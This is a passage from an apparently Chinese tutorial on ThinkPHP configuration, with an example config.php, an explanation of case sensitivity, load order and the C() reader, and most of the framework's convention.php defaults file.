class="keyword">type</span>=top'</span><br><span class="line">),</span><br><span class="line"></span><br><span class="line">    <span class="symbol">'DB_TYPE'</span>               =&gt;  <span class="symbol">'mysql'</span>,</span><br><span class="line">    <span class="symbol">'DB_HOST'</span>               =&gt;  <span class="symbol">'localhost'</span>,</span><br><span class="line">    <span class="symbol">'DB_NAME'</span>               =&gt;  <span class="symbol">'think'</span>,</span><br><span class="line">    <span class="symbol">'DB_USER'</span>               =&gt;  <span class="symbol">'root'</span>,</span><br><span class="line">    <span class="symbol">'DB_PWD'</span>                =&gt;  <span class="string">''</span>,</span><br><span class="line">    <span class="symbol">'DB_PORT'</span>               =&gt;  <span class="string">'3306'</span>,</span><br><span class="line">    <span class="symbol">'DB_PREFIX'</span>             =&gt;  <span class="symbol">'think_'</span>,</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>说明：ThinkPHP的配置参数（一级参数）是不区分大小写的，因为不管大写小写，最后都会转为小写。但是为了在编程的过程中更符合规范，建议统一使用大写来设置配置参数。上面的第一个配置URL_ROUTER_ON，我们开启了路由重写功能，为后面的 URL_ROUTE_RULES 奠定基础（详细的后面我们会在路由章节说到）。最后几个带DB_的设置项是表示设置连接数据库的参数，几乎每一个web应用都会用到数据库，这些设置为我们后续进一步学习的基础。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="keyword">return</span> <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'USER_CONFIG'</span>        =&gt; <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">        <span class="string">'USER_AUTH'</span> =&gt; <span class="keyword">true</span>,</span></span><br><span class="line"><span class="php">        <span class="string">'USER_TYPE'</span> =&gt; <span class="number">2</span>,</span></span><br><span class="line"><span class="php">    ),</span></span><br><span class="line"><span class="php">);</span></span><br></pre></td></tr></table></figure></p><p>如上面的USER_CONFIG下的USER_AUTH和USER_TYPE是区分大小写的。 这个只是示例，如果在项目中真的需要二级配置，请区分大小写，这些配置也是在Application/Common/Conf/config.php中配置的。</p><p>了解了ThinkPHP的配置格式后，我们再看看ThinkPHP的配置加载顺序，理解配置项的加载顺序在开发的时候很重要，因为在同名的配置下，后加载的配置会覆盖前面加载的顺序，而生效的只有后加载的顺序。</p><p>惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</p><p>上面的顺序就是ThinkPHP的配置加载顺序，而在一般情况下，这些配置都是自动加载的。我们最常操作的是应用配置，默认的就是在Application/Common/Conf/config.php文件中。在开发的时候我们可以在这里设置自己的配置，如果你不熟悉你可以配置什么值，你可以打开ThinkPHP/Conf/convention.php文件来查看相对应的配置项</p><p>读取配置<br>在开发的过程中，我们有时候需要读取应用的配置值，在ThinkPHP中统一使用C(‘配置参数名’)来读取配置。比如：<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$model = C(<span class="string">'URL_MODEL'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$model = C(<span class="string">'url_model'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>这两个是等效的，都是可以读取到系统的URL访问模式的设置值，因为在ThinkPHP的配置项是不分大小写的。但是建议统一使用大写方式。</p><p>可以利用config首字母来记忆C()方法。</p><h2 id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h2><p>查看ThinkPHP/Conf/convention.php的内容，对其中的配置项进行初步了解<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line">/**</span><br><span class="line"> * ThinkPHP惯例配置文件</span><br><span class="line"> * 该文件请不要修改，如果要覆盖惯例配置的值，可在应用配置文件中设定和惯例不符的配置项</span><br><span class="line"> * 配置名称大小写任意，系统会统一转换成小写</span><br><span class="line"> * 所有配置参数都可以在生效前动态改变</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php">defined(<span class="string">'THINK_PATH'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php"><span class="keyword">return</span>  <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="comment">/* 应用设定 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_USE_NAMESPACE'</span>     =&gt;  <span class="keyword">true</span>,    <span class="comment">// 应用类库是否使用命名空间</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_SUB_DOMAIN_DEPLOY'</span> =&gt;  <span class="keyword">false</span>,   <span class="comment">// 是否开启子域名部署</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_SUB_DOMAIN_RULES'</span>  =&gt;  <span class="keyword">array</span>(), <span class="comment">// 子域名部署规则</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_DOMAIN_SUFFIX'</span>     =&gt;  <span class="string">''</span>, <span class="comment">// 域名后缀 如果是com.cn net.cn 之类的后缀必须设置    </span></span></span><br><span class="line"><span class="php">    <span class="string">'ACTION_SUFFIX'</span>         =&gt;  <span class="string">''</span>, <span class="comment">// 操作方法后缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'MULTI_MODULE'</span>          =&gt;  <span class="keyword">true</span>, <span class="comment">// 是否允许多模块 如果为false 则必须设置 DEFAULT_MODULE</span></span></span><br><span class="line"><span class="php">    <span class="string">'MODULE_DENY_LIST'</span>      =&gt;  <span class="keyword">array</span>(<span class="string">'Common'</span>,<span class="string">'Runtime'</span>),</span></span><br><span class="line"><span class="php">    <span class="string">'CONTROLLER_LEVEL'</span>      =&gt;  <span class="number">1</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'APP_AUTOLOAD_LAYER'</span>    =&gt;  <span class="string">'Controller,Model'</span>, <span class="comment">// 自动加载的应用类库层 关闭APP_USE_NAMESPACE后有效</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_AUTOLOAD_PATH'</span>     =&gt;  <span class="string">'Model'</span>, <span class="comment">// 自动加载的路径 关闭APP_USE_NAMESPACE后有效</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* Cookie设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_EXPIRE'</span>         =&gt;  <span class="number">0</span>,    <span class="comment">// Cookie有效期</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_DOMAIN'</span>         =&gt;  <span class="string">''</span>,      <span class="comment">// Cookie有效域名</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_PATH'</span>           =&gt;  <span class="string">'/'</span>,     <span class="comment">// Cookie路径</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_PREFIX'</span>         =&gt;  <span class="string">''</span>,      <span class="comment">// Cookie前缀 避免冲突</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_HTTPONLY'</span>       =&gt;  <span class="string">''</span>,      <span class="comment">// Cookie httponly设置</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 默认设定 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_M_LAYER'</span>       =&gt;  <span class="string">'Model'</span>, <span class="comment">// 默认的模型层名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_C_LAYER'</span>       =&gt;  <span class="string">'Controller'</span>, <span class="comment">// 默认的控制器层名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_V_LAYER'</span>       =&gt;  <span class="string">'View'</span>, <span class="comment">// 默认的视图层名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_LANG'</span>          =&gt;  <span class="string">'zh-cn'</span>, <span class="comment">// 默认语言</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_THEME'</span>         =&gt;  <span class="string">''</span>,<span class="comment">// 默认模板主题名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_MODULE'</span>        =&gt;  <span class="string">'Home'</span>,  <span class="comment">// 默认模块</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_CONTROLLER'</span>    =&gt;  <span class="string">'Index'</span>, <span class="comment">// 默认控制器名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_ACTION'</span>        =&gt;  <span class="string">'index'</span>, <span class="comment">// 默认操作名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_CHARSET'</span>       =&gt;  <span class="string">'utf-8'</span>, <span class="comment">// 默认输出编码</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_TIMEZONE'</span>      =&gt;  <span class="string">'PRC'</span>,<span class="comment">// 默认时区</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_AJAX_RETURN'</span>   =&gt;  <span class="string">'JSON'</span>,  <span class="comment">// 默认AJAX 数据返回格式,可选JSON XML ...</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_JSONP_HANDLER'</span> =&gt;  <span class="string">'jsonpReturn'</span>, <span class="comment">// 默认JSONP格式返回的处理方法</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_FILTER'</span>        =&gt;  <span class="string">'htmlspecialchars'</span>, <span class="comment">// 默认参数过滤方法 用于I函数...</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 数据库设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_TYPE'</span>               =&gt;  <span class="string">''</span>,     <span class="comment">// 数据库类型</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_HOST'</span>               =&gt;  <span class="string">''</span>, <span class="comment">// 服务器地址</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_NAME'</span>               =&gt;  <span class="string">''</span>,          <span class="comment">// 数据库名</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_USER'</span>               =&gt;  <span class="string">''</span>,      <span class="comment">// 用户名</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PWD'</span>                =&gt;  <span class="string">''</span>,          <span class="comment">// 密码</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PORT'</span>               =&gt;  <span class="string">''</span>,        <span class="comment">// 端口</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PREFIX'</span>             =&gt;  <span class="string">''</span>,    <span class="comment">// 数据库表前缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_FIELDTYPE_CHECK'</span>    =&gt;  <span class="keyword">false</span>,       <span class="comment">// 是否进行字段类型检查</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_FIELDS_CACHE'</span>       =&gt;  <span class="keyword">true</span>,        <span class="comment">// 启用字段缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_CHARSET'</span>            =&gt;  <span class="string">'utf8'</span>,      <span class="comment">// 数据库编码默认采用utf8</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_DEPLOY_TYPE'</span>        =&gt;  <span class="number">0</span>, <span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_RW_SEPARATE'</span>        =&gt;  <span class="keyword">false</span>,       <span class="comment">// 数据库读写是否分离 主从式有效</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_MASTER_NUM'</span>         =&gt;  <span class="number">1</span>, <span class="comment">// 读写分离后 主服务器数量</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SLAVE_NO'</span>           =&gt;  <span class="string">''</span>, <span class="comment">// 指定从服务器序号</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_CACHE'</span>    =&gt;  <span class="keyword">false</span>, <span class="comment">// 数据库查询的SQL创建缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_QUEUE'</span>    =&gt;  <span class="string">'file'</span>,   <span class="comment">// SQL缓存队列的缓存方式 支持 file xcache和apc</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_LENGTH'</span>   =&gt;  <span class="number">20</span>, <span class="comment">// SQL缓存的队列长度</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_LOG'</span>            =&gt;  <span class="keyword">false</span>, <span class="comment">// SQL执行日志记录</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_BIND_PARAM'</span>         =&gt;  <span class="keyword">false</span>, <span class="comment">// 数据库写入数据自动参数绑定</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 数据缓存设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_TIME'</span>       =&gt;  <span class="number">0</span>,      <span class="comment">// 数据缓存有效期 0表示永久缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_COMPRESS'</span>   =&gt;  <span class="keyword">false</span>,   <span class="comment">// 数据缓存是否压缩缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_CHECK'</span>      =&gt;  <span class="keyword">false</span>,   <span class="comment">// 数据缓存是否校验缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_PREFIX'</span>     =&gt;  <span class="string">''</span>,     <span class="comment">// 缓存前缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_TYPE'</span>       =&gt;  <span class="string">'File'</span>,  <span class="comment">// 数据缓存类型,支持:File|Db|Apc|Memcache|Shmop|Sqlite|Xcache|Apachenote|Eaccelerator</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_PATH'</span>       =&gt;  TEMP_PATH,<span class="comment">// 缓存路径设置 (仅对File方式缓存有效)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_SUBDIR'</span>     =&gt;  <span class="keyword">false</span>,    <span class="comment">// 使用子目录缓存 (自动根据缓存标识的哈希创建子目录)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_PATH_LEVEL'</span>       =&gt;  <span class="number">1</span>,        <span class="comment">// 子目录缓存级别</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 错误设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'ERROR_MESSAGE'</span>         =&gt;  <span class="string">'页面错误！请稍后再试～'</span>,<span class="comment">//错误显示信息,非调试模式有效</span></span></span><br><span class="line"><span class="php">    <span class="string">'ERROR_PAGE'</span>            =&gt;  <span class="string">''</span>,<span class="comment">// 错误定向页面</span></span></span><br><span class="line"><span class="php">    <span class="string">'SHOW_ERROR_MSG'</span>        =&gt;  <span class="keyword">false</span>,    <span class="comment">// 显示错误信息</span></span></span><br><span class="line"><span class="php">    <span class="string">'TRACE_MAX_RECORD'</span>      =&gt;  <span class="number">100</span>,    <span class="comment">// 每个级别的错误信息 最大记录数</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 日志设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_RECORD'</span>            =&gt;  <span class="keyword">false</span>,   <span class="comment">// 默认不记录日志</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_TYPE'</span>              =&gt;  <span class="string">'File'</span>, <span class="comment">// 日志记录类型 默认为文件方式</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_LEVEL'</span>             =&gt;  <span class="string">'EMERG,ALERT,CRIT,ERR'</span>,<span class="comment">// 允许记录的日志级别</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_FILE_SIZE'</span>         =&gt;  <span class="number">2097152</span>,<span class="comment">// 日志文件大小限制</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_EXCEPTION_RECORD'</span>  =&gt;  <span class="keyword">false</span>,    <span class="comment">// 是否记录异常信息日志</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* SESSION设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_AUTO_START'</span>    =&gt;  <span class="keyword">true</span>,    <span class="comment">// 是否自动开启Session</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_OPTIONS'</span>       =&gt;  <span class="keyword">array</span>(), <span class="comment">// session 配置数组 支持type name id path expire domain 等参数</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_TYPE'</span>          =&gt;  <span class="string">''</span>, <span class="comment">// session hander类型 默认无需设置 除非扩展了session hander驱动</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_PREFIX'</span>        =&gt;  <span class="string">''</span>, <span class="comment">// session 前缀</span></span></span><br><span class="line"><span class="php">    <span class="comment">//'VAR_SESSION_ID'      =&gt;  'session_id',     //sessionID的提交变量</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 模板引擎设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CONTENT_TYPE'</span>     =&gt;  <span class="string">'text/html'</span>, <span class="comment">// 默认模板输出类型</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ACTION_ERROR'</span>     =&gt;  THINK_PATH.<span class="string">'Tpl/dispatch_jump.tpl'</span>, <span class="comment">// 默认错误跳转对应的模板文件</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ACTION_SUCCESS'</span>   =&gt;  THINK_PATH.<span class="string">'Tpl/dispatch_jump.tpl'</span>, <span class="comment">// 默认成功跳转对应的模板文件</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_EXCEPTION_FILE'</span>   =&gt;  THINK_PATH.<span class="string">'Tpl/think_exception.tpl'</span>,<span class="comment">// 异常页面的模板文件</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DETECT_THEME'</span>     =&gt;  <span class="keyword">false</span>,       <span class="comment">// 自动侦测模板主题</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_TEMPLATE_SUFFIX'</span>  =&gt;  <span class="string">'.html'</span>,     <span class="comment">// 默认模板文件后缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_FILE_DEPR'</span>        =&gt;  <span class="string">'/'</span>, <span class="comment">//模板文件CONTROLLER_NAME与ACTION_NAME之间的分割符</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 布局设置</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ENGINE_TYPE'</span>      =&gt;  <span class="string">'Think'</span>,     <span class="comment">// 默认模板引擎 以下设置仅对使用Think模板引擎有效</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHFILE_SUFFIX'</span>  =&gt;  <span class="string">'.php'</span>,      <span class="comment">// 默认模板缓存后缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DENY_FUNC_LIST'</span>   =&gt;  <span class="string">'echo,exit'</span>,    <span class="comment">// 模板引擎禁用函数</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DENY_PHP'</span>         =&gt;  <span class="keyword">false</span>, <span class="comment">// 默认模板引擎是否禁用PHP原生代码</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_L_DELIM'</span>          =&gt;  <span class="string">'&#123;'</span>,            <span class="comment">// 模板引擎普通标签开始标记</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_R_DELIM'</span>          =&gt;  <span class="string">'&#125;'</span>,            <span class="comment">// 模板引擎普通标签结束标记</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_VAR_IDENTIFY'</span>     =&gt;  <span class="string">'array'</span>,     <span class="comment">// 模板变量识别。留空自动判断,参数为'obj'则表示对象</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_STRIP_SPACE'</span>      =&gt;  <span class="keyword">true</span>,       <span class="comment">// 是否去除模板文件里面的html空格与换行</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_ON'</span>         =&gt;  <span class="keyword">true</span>,        <span class="comment">// 是否开启模板编译缓存,设为false则每次都会重新编译</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_PREFIX'</span>     =&gt;  <span class="string">''</span>,         <span class="comment">// 模板缓存前缀标识，可以动态改变</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_TIME'</span>       =&gt;  <span class="number">0</span>,         <span class="comment">// 模板缓存有效期 0 为永久，(以数字为值，单位:秒)</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_LAYOUT_ITEM'</span>      =&gt;  <span class="string">'&#123;__CONTENT__&#125;'</span>, <span class="comment">// 布局模板的内容替换标识</span></span></span><br><span class="line"><span class="php">    <span class="string">'LAYOUT_ON'</span>             =&gt;  <span class="keyword">false</span>, <span class="comment">// 是否启用布局</span></span></span><br><span class="line"><span class="php">    <span class="string">'LAYOUT_NAME'</span>           =&gt;  <span class="string">'layout'</span>, <span class="comment">// 当前布局名称 默认为layout</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// Think模板引擎标签库相关设定</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_BEGIN'</span>          =&gt;  <span class="string">'&lt;'</span>,  <span class="comment">// 标签库标签开始标记</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_END'</span>            =&gt;  <span class="string">'&gt;'</span>,  <span class="comment">// 标签库标签结束标记</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_LOAD'</span>           =&gt;  <span class="keyword">true</span>, <span class="comment">// 是否使用内置标签库之外的其它标签库，默认自动检测</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_BUILD_IN'</span>       =&gt;  <span class="string">'cx'</span>, <span class="comment">// 内置标签库名称(标签使用不必指定标签库名称),以逗号分隔 注意解析顺序</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_PRE_LOAD'</span>       =&gt;  <span class="string">''</span>,   <span class="comment">// 需要额外加载的标签库(须指定标签库名称)，多个以逗号分隔</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* URL设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_CASE_INSENSITIVE'</span>  =&gt;  <span class="keyword">true</span>,   <span class="comment">// 默认false 表示URL区分大小写 true则表示不区分大小写</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_MODEL'</span>             =&gt;  <span class="number">1</span>,       <span class="comment">// URL访问模式,可选参数0、1、2、3,代表以下四种模式：</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 0 (普通模式); 1 (PATHINFO 模式); 2 (REWRITE  模式); 3 (兼容模式)  默认为PATHINFO 模式</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PATHINFO_DEPR'</span>     =&gt;  <span class="string">'/'</span>,<span class="comment">// PATHINFO模式下，各参数之间的分割符号</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PATHINFO_FETCH'</span>    =&gt;  <span class="string">'ORIG_PATH_INFO,REDIRECT_PATH_INFO,REDIRECT_URL'</span>, <span class="comment">// 用于兼容判断PATH_INFO 参数的SERVER替代变量列表</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_REQUEST_URI'</span>       =&gt;  <span class="string">'REQUEST_URI'</span>, <span class="comment">// 获取当前页面地址的系统变量 默认为REQUEST_URI</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_HTML_SUFFIX'</span>       =&gt;  <span class="string">'html'</span>,  <span class="comment">// URL伪静态后缀设置</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_DENY_SUFFIX'</span>       =&gt;  <span class="string">'ico|png|gif|jpg'</span>, <span class="comment">// URL禁止访问的后缀设置</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_BIND'</span>       =&gt;  <span class="keyword">true</span>, <span class="comment">// URL变量绑定到Action方法参数</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_BIND_TYPE'</span>  =&gt;  <span class="number">0</span>, <span class="comment">// URL变量绑定的类型 0 按变量名绑定 1 按变量顺序绑定</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_FILTER'</span>     =&gt;  <span class="keyword">false</span>, <span class="comment">// URL变量绑定过滤</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_FILTER_TYPE'</span>=&gt;  <span class="string">''</span>, <span class="comment">// URL变量绑定过滤方法 如果为空 调用DEFAULT_FILTER</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_ROUTER_ON'</span>         =&gt;  <span class="keyword">false</span>,   <span class="comment">// 是否开启URL路由</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_ROUTE_RULES'</span>       =&gt;  <span class="keyword">array</span>(), <span 